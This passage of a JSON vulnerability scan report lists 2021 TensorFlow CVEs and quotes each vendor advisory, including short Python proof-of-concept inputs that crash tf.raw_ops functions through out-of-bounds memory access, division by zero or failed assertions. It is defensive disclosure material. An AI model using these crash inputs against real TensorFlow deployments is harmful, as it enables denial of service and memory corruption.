guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "4.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29597",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29597"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29597",
              "help": {
                "text": "Vulnerability CVE-2021-29597\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29597](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29597)\n### Impact\nThe implementation of the `SpaceToBatchNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/412c7d9bb8f8a762c5b266c9e73bfa165f29aac8/tensorflow/lite/kernels/space_to_batch_nd.cc#L82-L83):\n\n```cc\nTF_LITE_ENSURE_EQ(context, final_dim_size % block_shape[dim], 0);\noutput_size-\u003edata[dim + 1] = final_dim_size / block_shape[dim];\n```\n\nAn attacker can craft a model such that one dimension of the `block` input is 0. Hence, the corresponding value in `block_shape` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [6d36ba65577006affb272335b7c1abd829010708](https://github.com/tensorflow/tensorflow/commit/6d36ba65577006affb272335b7c1abd829010708).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29597**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29597](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29597)|\n\n### Impact\nThe implementation of the `SpaceToBatchNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/412c7d9bb8f8a762c5b266c9e73bfa165f29aac8/tensorflow/lite/kernels/space_to_batch_nd.cc#L82-L83):\n\n```cc\nTF_LITE_ENSURE_EQ(context, final_dim_size % block_shape[dim], 0);\noutput_size-\u003edata[dim + 1] = final_dim_size / block_shape[dim];\n```\n\nAn attacker can craft a model such that one dimension of the `block` input is 0. Hence, the corresponding value in `block_shape` is 0.\n\n### Patches\nWe have patched the issue in GitHub commit [6d36ba65577006affb272335b7c1abd829010708](https://github.com/tensorflow/tensorflow/commit/6d36ba65577006affb272335b7c1abd829010708).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29532",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29532"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29532",
              "help": {
                "text": "Vulnerability CVE-2021-29532\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29532](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29532)\n### Impact\nAn attacker can force accesses outside the bounds of heap allocated arrays by passing in invalid tensor values to `tf.raw_ops.RaggedCross`:\n\n```python\nimport tensorflow as tf\n\nragged_values = []\nragged_row_splits = [] \nsparse_indices = []\nsparse_values = []\nsparse_shape = []\n\ndense_inputs_elem = tf.constant([], shape=[92, 0], dtype=tf.int64)\ndense_inputs = [dense_inputs_elem]\n\ninput_order = \"R\"\nhashed_output = False\nnum_buckets = 0\nhash_key = 0 \n\ntf.raw_ops.RaggedCross(ragged_values=ragged_values,\n    ragged_row_splits=ragged_row_splits,\n    sparse_indices=sparse_indices,\n    sparse_values=sparse_values,\n    sparse_shape=sparse_shape,\n    dense_inputs=dense_inputs,\n    input_order=input_order,\n    hashed_output=hashed_output,\n    num_buckets=num_buckets,\n    hash_key=hash_key,\n    out_values_type=tf.int64,\n    out_row_splits_type=tf.int64)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/efea03b38fb8d3b81762237dc85e579cc5fc6e87/tensorflow/core/kernels/ragged_cross_op.cc#L456-L487) lacks validation for the user supplied arguments:\n\n```cc\nint next_ragged = 0;\nint next_sparse = 0;\nint next_dense = 0;\nfor (char c : input_order_) {\n  if (c == `R`) {\n    TF_RETURN_IF_ERROR(BuildRaggedFeatureReader(\n        ragged_values_list[next_ragged], ragged_splits_list[next_ragged],\n        features));\n    next_ragged++;\n  } else if (c == `S`) {\n    TF_RETURN_IF_ERROR(BuildSparseFeatureReader(\n        sparse_indices_list[next_sparse], sparse_values_list[next_sparse],\n        batch_size, features));\n    next_sparse++;\n  } else if (c == `D`) {\n    TF_RETURN_IF_ERROR(\n        BuildDenseFeatureReader(dense_list[next_dense++], features));\n  }\n  ...\n}\n```\n\nEach of the above branches call a helper function after accessing array elements via a `*_list[next_*]` pattern, followed by incrementing the `next_*` index. However, as there is no validation that the `next_*` values are in the valid range for the corresponding `*_list` arrays, this results in heap OOB reads.\n\n### Patches\nWe have patched the issue in GitHub commit [44b7f486c0143f68b56c34e2d01e146ee445134a](https://github.com/tensorflow/tensorflow/commit/44b7f486c0143f68b56c34e2d01e146ee445134a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29532**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29532](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29532)|\n\n### Impact\nAn attacker can force accesses outside the bounds of heap allocated arrays by passing in invalid tensor values to `tf.raw_ops.RaggedCross`:\n\n```python\nimport tensorflow as tf\n\nragged_values = []\nragged_row_splits = [] \nsparse_indices = []\nsparse_values = []\nsparse_shape = []\n\ndense_inputs_elem = tf.constant([], shape=[92, 0], dtype=tf.int64)\ndense_inputs = [dense_inputs_elem]\n\ninput_order = \"R\"\nhashed_output = False\nnum_buckets = 0\nhash_key = 0 \n\ntf.raw_ops.RaggedCross(ragged_values=ragged_values,\n    ragged_row_splits=ragged_row_splits,\n    sparse_indices=sparse_indices,\n    sparse_values=sparse_values,\n    sparse_shape=sparse_shape,\n    dense_inputs=dense_inputs,\n    input_order=input_order,\n    hashed_output=hashed_output,\n    num_buckets=num_buckets,\n    hash_key=hash_key,\n    out_values_type=tf.int64,\n    out_row_splits_type=tf.int64)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/efea03b38fb8d3b81762237dc85e579cc5fc6e87/tensorflow/core/kernels/ragged_cross_op.cc#L456-L487) lacks validation for the user supplied arguments:\n\n```cc\nint next_ragged = 0;\nint next_sparse = 0;\nint next_dense = 0;\nfor (char c : input_order_) {\n  if (c == `R`) {\n    TF_RETURN_IF_ERROR(BuildRaggedFeatureReader(\n        ragged_values_list[next_ragged], ragged_splits_list[next_ragged],\n        features));\n    next_ragged++;\n  } else if (c == `S`) {\n    TF_RETURN_IF_ERROR(BuildSparseFeatureReader(\n        sparse_indices_list[next_sparse], sparse_values_list[next_sparse],\n        batch_size, features));\n    next_sparse++;\n  } else if (c == `D`) {\n    TF_RETURN_IF_ERROR(\n        BuildDenseFeatureReader(dense_list[next_dense++], features));\n  }\n  ...\n}\n```\n\nEach of the above branches call a helper function after accessing array elements via a `*_list[next_*]` pattern, followed by incrementing the `next_*` index. However, as there is no validation that the `next_*` values are in the valid range for the corresponding `*_list` arrays, this results in heap OOB reads.\n\n### Patches\nWe have patched the issue in GitHub commit [44b7f486c0143f68b56c34e2d01e146ee445134a](https://github.com/tensorflow/tensorflow/commit/44b7f486c0143f68b56c34e2d01e146ee445134a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29527",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29527"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29527",
              "help": {
                "text": "Vulnerability CVE-2021-29527\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29527)\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.QuantizedConv2D`:\n\n```python\nimport tensorflow as tf\n\ninput = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)\nfilter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)\nmin_input = tf.constant(0.0)\nmax_input = tf.constant(0.0001)\nmin_filter = tf.constant(0.0)\nmax_filter = tf.constant(0.0001)\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"               \n                               \n\ntf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)\n```\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/00e9a4d67d76703fa1aee33dac582acf317e0e81/tensorflow/core/kernels/quantized_conv_ops.cc#L257-L259) does a division by a quantity that is controlled by the caller: \n\n```cc\nconst int filter_value_count = filter_width * filter_height * input_depth;\nconst int64 patches_per_chunk = kMaxChunkSize / (filter_value_count * sizeof(T1));\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [cfa91be9863a91d5105a3b4941096044ab32036b](https://github.com/tensorflow/tensorflow/commit/cfa91be9863a91d5105a3b4941096044ab32036b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29527**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29527)|\n\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.QuantizedConv2D`:\n\n```python\nimport tensorflow as tf\n\ninput = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)\nfilter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)\nmin_input = tf.constant(0.0)\nmax_input = tf.constant(0.0001)\nmin_filter = tf.constant(0.0)\nmax_filter = tf.constant(0.0001)\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"               \n                               \n\ntf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)\n```\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/00e9a4d67d76703fa1aee33dac582acf317e0e81/tensorflow/core/kernels/quantized_conv_ops.cc#L257-L259) does a division by a quantity that is controlled by the caller: \n\n```cc\nconst int filter_value_count = filter_width * filter_height * input_depth;\nconst int64 patches_per_chunk = kMaxChunkSize / (filter_value_count * sizeof(T1));\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [cfa91be9863a91d5105a3b4941096044ab32036b](https://github.com/tensorflow/tensorflow/commit/cfa91be9863a91d5105a3b4941096044ab32036b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29603",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29603"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29603",
              "help": {
                "text": "Vulnerability CVE-2021-29603\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29603](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29603)\n### Impact\nA specially crafted TFLite model could trigger an OOB write on heap in the TFLite implementation of [`ArgMin`/`ArgMax`](https://github.com/tensorflow/tensorflow/blob/102b211d892f3abc14f845a72047809b39cc65ab/tensorflow/lite/kernels/arg_min_max.cc#L52-L59):\n\n```cc\nTfLiteIntArray* output_dims = TfLiteIntArrayCreate(NumDimensions(input) - 1);\nint j = 0;\nfor (int i = 0; i \u003c NumDimensions(input); ++i) { \n  if (i != axis_value) {\n    output_dims-\u003edata[j] = SizeOfDimension(input, i);\n    ++j;\n  }\n}\n```\n\nIf `axis_value` is not a value between 0 and `NumDimensions(input)`, then the condition in the `if` is never true, so code writes past the last valid element of `output_dims-\u003edata`.\n  \n### Patches \nWe have patched the issue in GitHub commit [c59c37e7b2d563967da813fa50fe20b21f4da683](https://github.com/tensorflow/tensorflow/commit/c59c37e7b2d563967da813fa50fe20b21f4da683).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29603**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29603](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29603)|\n\n### Impact\nA specially crafted TFLite model could trigger an OOB write on heap in the TFLite implementation of [`ArgMin`/`ArgMax`](https://github.com/tensorflow/tensorflow/blob/102b211d892f3abc14f845a72047809b39cc65ab/tensorflow/lite/kernels/arg_min_max.cc#L52-L59):\n\n```cc\nTfLiteIntArray* output_dims = TfLiteIntArrayCreate(NumDimensions(input) - 1);\nint j = 0;\nfor (int i = 0; i \u003c NumDimensions(input); ++i) { \n  if (i != axis_value) {\n    output_dims-\u003edata[j] = SizeOfDimension(input, i);\n    ++j;\n  }\n}\n```\n\nIf `axis_value` is not a value between 0 and `NumDimensions(input)`, then the condition in the `if` is never true, so code writes past the last valid element of `output_dims-\u003edata`.\n  \n### Patches \nWe have patched the issue in GitHub commit [c59c37e7b2d563967da813fa50fe20b21f4da683](https://github.com/tensorflow/tensorflow/commit/c59c37e7b2d563967da813fa50fe20b21f4da683).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29586",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29586"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29586",
              "help": {
                "text": "Vulnerability CVE-2021-29586\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29586](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29586)\n### Impact\nOptimized pooling implementations in TFLite fail to check that the stride arguments are not 0 before calling [`ComputePaddingHeightWidth`](https://github.com/tensorflow/tensorflow/blob/3f24ccd932546416ec906a02ddd183b48a1d2c83/tensorflow/lite/kernels/pooling.cc#L90).\n\nSince users can craft special models which will have `params-\u003estride_{height,width}` be zero, this will result in a division by zero.\n                          \n### Patches\nWe have patched the issue in GitHub commit [5f7975d09eac0f10ed8a17dbb6f5964977725adc](https://github.com/tensorflow/tensorflow/commit/5f7975d09eac0f10ed8a17dbb6f5964977725adc).\n      \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n      \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29586**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29586](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29586)|\n\n### Impact\nOptimized pooling implementations in TFLite fail to check that the stride arguments are not 0 before calling [`ComputePaddingHeightWidth`](https://github.com/tensorflow/tensorflow/blob/3f24ccd932546416ec906a02ddd183b48a1d2c83/tensorflow/lite/kernels/pooling.cc#L90).\n\nSince users can craft special models which will have `params-\u003estride_{height,width}` be zero, this will result in a division by zero.\n                          \n### Patches\nWe have patched the issue in GitHub commit [5f7975d09eac0f10ed8a17dbb6f5964977725adc](https://github.com/tensorflow/tensorflow/commit/5f7975d09eac0f10ed8a17dbb6f5964977725adc).\n      \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n      \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29567",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29567"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29567",
              "help": {
                "text": "Vulnerability CVE-2021-29567\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29567](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29567)\n### Impact\nDue to lack of validation in `tf.raw_ops.SparseDenseCwiseMul`, an attacker can trigger denial of service via `CHECK`-fails or accesses to outside the bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant([], shape=[10, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\nshape = tf.constant([0, 0], shape=[2], dtype=tf.int64)\ndense = tf.constant([], shape=[0], dtype=tf.int64)\n  \ntf.raw_ops.SparseDenseCwiseMul(\n    sp_indices=indices, sp_values=values, sp_shape=shape, dense=dense)\n```\n\nSince the [implementation](https://github.com/tensorflow/tensorflow/blob/38178a2f7a681a7835bb0912702a134bfe3b4d84/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc#L68-L80) only validates the rank of the input arguments but no [constraints between dimensions](https://www.tensorflow.org/api_docs/python/tf/raw_ops/SparseDenseCwiseMul), an attacker can abuse them to trigger internal `CHECK` assertions (and cause program termination, denial of service) or to write to memory outside of bounds of heap allocated tensor buffers.\n\n### Patches\nWe have patched the issue in GitHub commit [7ae2af34087fb4b5c8915279efd03da3b81028bc](https://github.com/tensorflow/tensorflow/commit/7ae2af34087fb4b5c8915279efd03da3b81028bc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29567**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29567](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29567)|\n\n### Impact\nDue to lack of validation in `tf.raw_ops.SparseDenseCwiseMul`, an attacker can trigger denial of service via `CHECK`-fails or accesses to outside the bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant([], shape=[10, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\nshape = tf.constant([0, 0], shape=[2], dtype=tf.int64)\ndense = tf.constant([], shape=[0], dtype=tf.int64)\n  \ntf.raw_ops.SparseDenseCwiseMul(\n    sp_indices=indices, sp_values=values, sp_shape=shape, dense=dense)\n```\n\nSince the [implementation](https://github.com/tensorflow/tensorflow/blob/38178a2f7a681a7835bb0912702a134bfe3b4d84/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc#L68-L80) only validates the rank of the input arguments but no [constraints between dimensions](https://www.tensorflow.org/api_docs/python/tf/raw_ops/SparseDenseCwiseMul), an attacker can abuse them to trigger internal `CHECK` assertions (and cause program termination, denial of service) or to write to memory outside of bounds of heap allocated tensor buffers.\n\n### Patches\nWe have patched the issue in GitHub commit [7ae2af34087fb4b5c8915279efd03da3b81028bc](https://github.com/tensorflow/tensorflow/commit/7ae2af34087fb4b5c8915279efd03da3b81028bc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29619",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29619"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29619",
              "help": {
                "text": "Vulnerability CVE-2021-29619\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29619](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29619)\n### Impact\nPassing invalid arguments (e.g., discovered via fuzzing) to `tf.raw_ops.SparseCountSparseOutput` results in segfault.\n\n### Patches\nWe have patched the issue in GitHub commit [82e6203221865de4008445b13c69b6826d2b28d9](https://github.com/tensorflow/tensorflow/commit/82e6203221865de4008445b13c69b6826d2b28d9).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-29619**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29619](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29619)|\n\n### Impact\nPassing invalid arguments (e.g., discovered via fuzzing) to `tf.raw_ops.SparseCountSparseOutput` results in segfault.\n\n### Patches\nWe have patched the issue in GitHub commit [82e6203221865de4008445b13c69b6826d2b28d9](https://github.com/tensorflow/tensorflow/commit/82e6203221865de4008445b13c69b6826d2b28d9).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29533",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29533"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29533",
              "help": {
                "text": "Vulnerability CVE-2021-29533\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29533)\n### Impact\nAn attacker can trigger a denial of service via a `CHECK` failure by passing an empty image to `tf.raw_ops.DrawBoundingBoxes`:\n\n```python\nimport tensorflow as tf\n\nimages = tf.fill([53, 0, 48, 1], 0.)\nboxes = tf.fill([53, 31, 4], 0.)\nboxes = tf.Variable(boxes)\nboxes[0, 0, 0].assign(3.90621)\ntf.raw_ops.DrawBoundingBoxes(images=images, boxes=boxes)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/ea34a18dc3f5c8d80a40ccca1404f343b5d55f91/tensorflow/core/kernels/image/draw_bounding_box_op.cc#L148-L165) uses `CHECK_*` assertions instead of `OP_REQUIRES` to validate user controlled inputs. Whereas `OP_REQUIRES` allows returning an error condition back to the user, the `CHECK_*` macros result in a crash if the condition is false, similar to `assert`.\n\n```cc\nconst int64 max_box_row_clamp = std::min\u003cint64\u003e(max_box_row, height - 1);\n... \nCHECK_GE(max_box_row_clamp, 0);\n``` \n    \nIn this case, `height` is 0 from the `images` input. This results in `max_box_row_clamp` being negative and the assertion being falsified, followed by aborting program execution.\n    \n### Patches\nWe have patched the issue in GitHub commit [b432a38fe0e1b4b904a6c222cbce794c39703e87](https://github.com/tensorflow/tensorflow/commit/b432a38fe0e1b4b904a6c222cbce794c39703e87).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29533**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29533](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29533)|\n\n### Impact\nAn attacker can trigger a denial of service via a `CHECK` failure by passing an empty image to `tf.raw_ops.DrawBoundingBoxes`:\n\n```python\nimport tensorflow as tf\n\nimages = tf.fill([53, 0, 48, 1], 0.)\nboxes = tf.fill([53, 31, 4], 0.)\nboxes = tf.Variable(boxes)\nboxes[0, 0, 0].assign(3.90621)\ntf.raw_ops.DrawBoundingBoxes(images=images, boxes=boxes)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/ea34a18dc3f5c8d80a40ccca1404f343b5d55f91/tensorflow/core/kernels/image/draw_bounding_box_op.cc#L148-L165) uses `CHECK_*` assertions instead of `OP_REQUIRES` to validate user controlled inputs. Whereas `OP_REQUIRES` allows returning an error condition back to the user, the `CHECK_*` macros result in a crash if the condition is false, similar to `assert`.\n\n```cc\nconst int64 max_box_row_clamp = std::min\u003cint64\u003e(max_box_row, height - 1);\n... \nCHECK_GE(max_box_row_clamp, 0);\n``` \n    \nIn this case, `height` 